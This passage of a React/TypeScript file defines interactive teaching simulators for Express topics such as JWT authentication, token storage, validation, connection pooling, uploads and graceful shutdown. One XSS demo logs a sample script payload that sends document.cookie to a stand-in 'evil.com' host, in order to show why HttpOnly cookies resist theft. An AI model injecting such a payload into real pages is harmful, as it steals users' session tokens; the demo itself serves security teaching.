          <span className={`font-mono font-bold ${reqs.length > LIMIT ? "text-rose-500 animate-pulse" : "text-emerald-400"}`}>
            {reqs.length} / {LIMIT} reqs
          </span>
        </div>

        <button onClick={clickSpam} className="w-full bg-rose-600 hover:bg-rose-500 text-white font-medium text-xs py-2 rounded">
          Spam API Call!
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 30. How do you handle authentication in an Express API?
  const Simulator30 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const handleStepAuth = () => {
      setStep((prev: number) => (prev + 1) % 5);
      clearLogs();
      const stepMsg = [
        "Step 1: Client submits login credentials POST /api/login { username, password }",
        "Step 2: Server verifies database credentials, signs JWT payload via crypto key.",
        "Step 3: Server returns signed secure JWT inside JSON response envelope.",
        "Step 4: Client stores JWT, appending it in Authorization Bearer headers for subsequent API queries.",
        "Step 5: Auth Middleware intercepts request, verifies JWT, and attaches payload to req.user."
      ];
      addLog(stepMsg[step]);
    };

    return (
      <div className="space-y-4">
        <div className="p-3 rounded-lg border border-slate-800 bg-slate-900">
          <h4 className="text-xs font-bold text-slate-300 mb-2">Step-by-Step JWT Auth Loop</h4>
          <div className="flex gap-1 justify-between">
            {[1, 2, 3, 4, 5].map((s) => (
              <div key={s} className={`h-8 w-8 rounded-full border flex items-center justify-center font-bold text-xs ${step + 1 === s ? "bg-emerald-600 border-emerald-400 text-white scale-110" : "bg-slate-950 border-slate-800 text-slate-600"}`}>
                {s}
              </div>
            ))}
          </div>
        </div>

        <button onClick={handleStepAuth} className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-medium text-xs py-2 rounded">
          Step Auth Sequence
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 31. JWT (JSON Web Token) Sandbox
  const Simulator31 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [payloadUser, setPayloadUser] = useState("alice");
    const [secret, setSecret] = useState("secret123");

    // base64 mock encoder
    const mockJWT = `eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiR7cGF5bG9hZFVzZXJ9Iiwicm9sZSI6ImFkbWluIn0.${btoa(payloadUser + secret).slice(0, 15)}`;

    return (
      <div className="space-y-4">
        <div className="grid grid-cols-2 gap-3 text-xs">
          <div>
            <label className="text-[10px] text-slate-400 block mb-1">Payload Username:</label>
            <input
              type="text"
              value={payloadUser}
              onChange={(e) => setPayloadUser(e.target.value)}
              className="w-full bg-slate-950 border border-slate-800 rounded p-1.5 font-mono text-cyan-400"
            />
          </div>
          <div>
            <label className="text-[10px] text-slate-400 block mb-1">Signing Secret Key:</label>
            <input
              type="text"
              value={secret}
              onChange={(e) => setSecret(e.target.value)}
              className="w-full bg-slate-950 border border-slate-800 rounded p-1.5 font-mono text-rose-400"
            />
          </div>
        </div>

        <div className="p-3 rounded-lg border border-slate-800 bg-slate-950 font-mono text-[10px] leading-4 select-all">
          <div className="text-red-400 font-bold truncate">eyJhbGciOiJIUzI1NiJ9 (Header)</div>
          <div className="text-cyan-400 font-bold truncate">.eyJ1c2VybmFtZSI6IiR7cGF5bG9hZFVzZXJ9Iiwicm9sZSI6ImFkbWluIn0 (Payload)</div>
          <div className="text-cyan-400 font-bold truncate">.{btoa(payloadUser + secret).slice(0, 20)} (Signature)</div>
        </div>
        {renderTerminal()}
      </div>
    );
  };

  // 32. XSS & JWT Storage
  const Simulator32 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [storageMethod, setStorageMethod] = useState("localStorage");

    const triggerXSSAttack = () => {
      clearLogs();
      addLog("Hacker: Injected <script>fetch('http://evil.com?leak=' + document.cookie)</script>");
      
      if (storageMethod === "localStorage") {
        addLog("Hacker Status: SUCCESS! Retrieved JWT token successfully via window.localStorage access!");
        addLog("Account breached! Token transmitted to rogue collection site.");
      } else {
        addLog("Browser Protection: COOKIE LOCKED! Flag 'HttpOnly' was set.");
        addLog("Hacker Status: FAILED. JavaScript cannot access cookie parameters.");
        addLog("Security Safe.");
      }
    };

    return (
      <div className="space-y-4">
        <div className="flex items-center justify-between bg-slate-900 p-3 rounded-lg border border-slate-800">
          <span className="text-xs font-semibold">Token Storage Selection:</span>
          <select
            value={storageMethod}
            onChange={(e) => setStorageMethod(e.target.value)}
            className="bg-slate-950 border border-slate-800 rounded text-xs p-1.5 text-slate-300 focus:outline-none"
          >
            <option value="localStorage">window.localStorage (JS accessible)</option>
            <option value="httpOnly">HttpOnly, Secure Cookie (Protected)</option>
          </select>
        </div>

        <button onClick={triggerXSSAttack} className="w-full bg-rose-600 hover:bg-rose-500 text-white font-medium text-xs py-2 rounded">
          Simulate XSS Injection Attack
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 33. Zod body validation
  const Simulator33 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [email, setEmail] = useState("bademail");
    const [age, setAge] = useState(15);

    const handleValidate = () => {
      clearLogs();
      addLog(`Validating input data: email="${email}", age=${age}`);
      
      const emailValid = email.includes("@") && email.includes(".");
      const ageValid = age >= 18;

      if (emailValid && ageValid) {
        addLog("Zod Schema: safeParse() SUCCESS! Body conforms to backend constraints.");
        addLog("Routing to usersController.createUser(req, res)");
      } else {
        addLog("Zod Schema: safeParse() FAILED. Schema mismatch found.");
        if (!emailValid) addLog("  - Validation Error: 'email' must carry valid email notation syntax.");
        if (!ageValid) addLog("  - Validation Error: 'age' must represent value >= 18.");
        addLog("Server Response Status: 400 Bad Request maps.");
      }
    };

    return (
      <div className="space-y-4">
        <div className="grid grid-cols-2 gap-3 text-xs">
          <div>
            <label className="text-[10px] text-slate-400 block mb-1">Email input:</label>
            <input
              type="text"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full bg-slate-950 border border-slate-800 rounded p-1.5"
            />
          </div>
          <div>
            <label className="text-[10px] text-slate-400 block mb-1">Age input:</label>
            <input
              type="number"
              value={age}
              onChange={(e) => setAge(parseInt(e.target.value) || 0)}
              className="w-full bg-slate-950 border border-slate-800 rounded p-1.5"
            />
          </div>
        </div>

        <button onClick={handleValidate} className="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-medium text-xs py-2 rounded">
          Test Request Validation Block
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 34. Environment Config (.env)
  const Simulator34 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [env, setEnv] = useState("Development");

    return (
      <div className="space-y-4">
        <div className="flex items-center justify-between bg-slate-900 p-3 rounded-lg border border-slate-800">
          <span className="text-xs font-semibold">Active Server Environment:</span>
          <button
            onClick={() => {
              const next = env === "Development" ? "Production" : "Development";
              setEnv(next);
              clearLogs();
              addLog(`Switched runtime environment mapping configuration profile to ${next}.`);
            }}
            className={`px-3 py-1.5 rounded-md text-xs font-semibold ${env === "Development" ? "bg-cyan-600 text-white" : "bg-cyan-600 text-white"}`}
          >
            {env === "Development" ? "🚧 DEVELOPMENT" : "🚀 PRODUCTION"}
          </button>
        </div>

        <div className="border border-slate-800 rounded-lg overflow-hidden text-xs">
          <div className="bg-slate-900 px-3 py-1.5 font-bold border-b border-slate-800 text-slate-300">
            process.env values
          </div>
          <div className="divide-y divide-slate-900 font-mono text-[10px] bg-slate-950 p-2 space-y-1">
            <div>PORT: {env === "Development" ? "3000" : "80"}</div>
            <div>DATABASE_URL: {env === "Development" ? "postgresql://localhost:5432/dev_db" : "postgresql://production-cluster-aws.com/secure_db"}</div>
            <div>DEBUG_LOGS: {env === "Development" ? "verbose" : "errors_only"}</div>
          </div>
        </div>
        {renderTerminal()}
      </div>
    );
  };

  // 35. Database connection
  const Simulator35 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    return (
      <div className="space-y-4">
        <div className="border border-slate-800 bg-slate-900 rounded-lg p-3 text-center">
          <Database className="mx-auto text-cyan-400 mb-2 animate-bounce" size={32} />
          <h4 className="text-xs font-bold text-slate-200">Shared Client Database Instance</h4>
          <p className="text-[10px] text-slate-400 mt-1">Single db pool instantiated at boot, shared safely among all route threads.</p>
        </div>

        <button
          onClick={() => {
            clearLogs();
            addLog("Database client initialized connection handshake pool...");
            addLog("Database pool: Established 10 active connections. Status: Idle.");
            setTimeout(() => addLog("Database pool: Borrowed connection #1 for query."), 500);
            setTimeout(() => addLog("Database pool: Query finished, returned connection #1 back cleanly."), 1200);
          }}
          className="w-full bg-slate-950 hover:bg-slate-900 border border-slate-800 text-xs py-2 rounded"
        >
          Verify Pool Handshakes
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 36. Connection Pooling
  const Simulator36 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [poolingMode, setPoolingMode] = useState(true);

    const runConns = () => {
      clearLogs();
      if (poolingMode) {
        addLog("Pool mode active: borrowing cached connections sequentially...");
        addLog("Borrowing client connection 1... done");
        addLog("Borrowing client connection 2... done");
        addLog("Steady CPU cycles, zero connection overhead limit alerts.");
      } else {
        addLog("Standard Individual client mode: spawning new TCP/TLS queries...");
        addLog("Attempting connection 1: TCP Syn -> SynAck -> Ack -> Auth handshake... (120ms)");
        addLog("Attempting connection 2: TCP Syn -> SynAck -> Ack -> Auth handshake... (125ms)");
        addLog("CRITICAL: Connection limit of 5 client sockets hit on database server. Incoming requests rejected!");
      }
    };

    return (
      <div className="space-y-4">
        <div className="grid grid-cols-2 gap-3 text-xs">
          <button
            onClick={() => setPoolingMode(true)}
            className={`p-3 rounded-lg border text-left ${poolingMode ? "border-emerald-500 bg-emerald-950/20" : "border-slate-800 bg-slate-900"}`}
          >
            <h5 className="font-bold">Using Connection Pool</h5>
            <p className="text-[10px] text-slate-500 mt-1">Caches open clients. Blazing fast throughput.</p>
          </button>
          <button
            onClick={() => setPoolingMode(false)}
            className={`p-3 rounded-lg border text-left ${!poolingMode ? "border-rose-500 bg-rose-950/20" : "border-slate-800 bg-slate-900"}`}
          >
            <h5 className="font-bold">Raw Connections</h5>
            <p className="text-[10px] text-slate-500 mt-1">Connect/disconnect on every query. Prone to socket crash.</p>
          </button>
        </div>

        <button onClick={runConns} className="w-full bg-slate-950 hover:bg-slate-900 border border-slate-800 text-xs py-2 rounded">
          Spam Queries Simulation
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 37. Multipart file upload (Multer)
  const Simulator37 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    return (
      <div className="space-y-4">
        <div className="border-2 border-dashed border-slate-700 bg-slate-900 rounded-lg p-5 text-center cursor-pointer hover:border-emerald-500 transition-colors">
          <Send className="mx-auto text-slate-500 mb-2" size={28} />
          <p className="text-xs text-slate-300">Drag or click to select mock upload file</p>
          <span className="text-[10px] text-slate-500">(Supports PNG, JPG, PDF up to 5MB)</span>
        </div>

        <div className="grid grid-cols-3 gap-2">
          {["photo.png", "doc.pdf", "report.xlsx"].map((file) => (
            <button
              key={file}
              onClick={() => {
                clearLogs();
                addLog(`Uploading mock file: ${file}`);
                addLog("Multipart Header read: Boundary payload separation detected.");
                addLog("Multer processing file buffers streams...");
                setTimeout(() => {
                  addLog(`Successfully moved raw upload chunk to '/uploads/${Date.now()}_${file}'`);
                  addLog("req.file generated => { fieldname: 'avatar', originalname: '" + file + "', size: 10245 }");
                }, 1000);
              }}
              className="p-2 bg-slate-950 border border-slate-800 rounded text-center text-[10px] text-slate-300 hover:border-emerald-500 transition-colors"
            >
              Upload {file}
            </button>
          ))}
        </div>
        {renderTerminal()}
      </div>
    );
  };

  // 38. Clustering in Node.js
  const Simulator38 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [load, setLoad] = useState(1);

    return (
      <div className="space-y-4">
        <div className="p-3 bg-slate-900 border border-slate-800 rounded-lg space-y-2">
          <div className="flex justify-between items-center text-xs">
            <span>Core Balancer Load intensity:</span>
            <span className="font-mono font-bold text-cyan-400">{load * 100} req/sec</span>
          </div>
          <input
            type="range"
            min={1}
            max={5}
            value={load}
            onChange={(e) => setLoad(parseInt(e.target.value))}
            className="w-full accent-cyan-500"
          />
        </div>

        <div className="grid grid-cols-4 gap-2">
          {[1, 2, 3, 4].map((core) => {
            const utilization = Math.min(100, Math.floor((load * 18) + (Math.random() * 10)));
            return (
              <div key={core} className="p-2 bg-slate-950 border border-slate-800 rounded text-center">
                <span className="text-[10px] text-slate-400 block font-bold">Worker CPU {core}</span>
                <span className="text-xs font-mono font-bold text-cyan-400">{utilization}%</span>
                <div className="w-full bg-slate-900 rounded-full h-1.5 mt-1 overflow-hidden">
                  <div className="bg-cyan-500 h-full" style={{ width: `${utilization}%` }}></div>
                </div>
              </div>
            );
          })}
        </div>
        {renderTerminal()}
      </div>
    );
  };

  // 39. Graceful shutdown
  const Simulator39 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const triggerSIGTERM = () => {
      clearLogs();
      addLog("Sending system signal: SIGTERM (Exit request)...");
      
      setTimeout(() => {
        addLog("1. server.close() triggered -> Restricting incoming HTTP handshakes.");
        addLog("   - Active connections waiting inside queue: 3 in-flight.");
      }, 500);

      setTimeout(() => {
        addLog("2. All active connections cleanly responded. Sockets safely shut.");
      }, 1500);

      setTimeout(() => {
        addLog("3. Closing database Pool connections client arrays...");
        addLog("   - PostgreSQL clients logged out of remote servers safely.");
      }, 2500);

      setTimeout(() => {
        addLog("4. Cleanup finished cleanly. Process shutting down via process.exit(0).");
      }, 3500);
    };

    return (
      <div className="space-y-4">
        <button onClick={triggerSIGTERM} className="w-full bg-rose-600 hover:bg-rose-500 text-white font-semibold text-xs py-3 rounded-lg flex items-center justify-center gap-1.5">
          <AlertCircle size={16} /> Emit SIGTERM Terminal Interrupt Signal
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 40. res.send() vs res.json() vs res.end()
  const Simulator40 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    return (
      <div className="space-y-4">
        <div className="grid grid-cols-3 gap-2 text-xs">
          <button
            onClick={() => {
              clearLogs();
              addLog("Fired route handler with: res.json({ status: 'ok' })");
              addLog("Express actions:");
              addLog("  - Set Content-Type: application/json; charset=utf-8");
              addLog("  - Stringified JS Object payload block.");
              addLog("  - Response Body: '{\"status\":\"ok\"}'");
            }}
            className="p-3 bg-slate-900 border border-slate-800 rounded hover:border-emerald-500 transition-colors"
          >
            res.json()
          </button>
          <button
            onClick={() => {
              clearLogs();
              addLog("Fired route handler with: res.send('<h1>Hi</h1>')");
              addLog("Express actions:");
              addLog("  - Analyzed string: '<h1>Hi</h1>'");
              addLog("  - Set Content-Type: text/html; charset=utf-8");
              addLog("  - Response Body: '<h1>Hi</h1>'");
            }}
            className="p-3 bg-slate-900 border border-slate-800 rounded hover:border-emerald-500 transition-colors"
          >
            res.send()
          </button>
          <button
            onClick={() => {
              clearLogs();
              addLog("Fired route handler with: res.status(204).end()");
              addLog("Express actions:");
              addLog("  - Skipped payload body serializer parsing.");
              addLog("  - Bypassed adding Content-Type headers completely.");
              addLog("  - Output raw bytes stream closed instantly.");
            }}
            className="p-3 bg-slate-900 border border-slate-800 rounded hover:border-emerald-500 transition-colors"
          >
            res.end()
          </button>
        </div>
        {renderTerminal()}
      </div>
    );
  };

  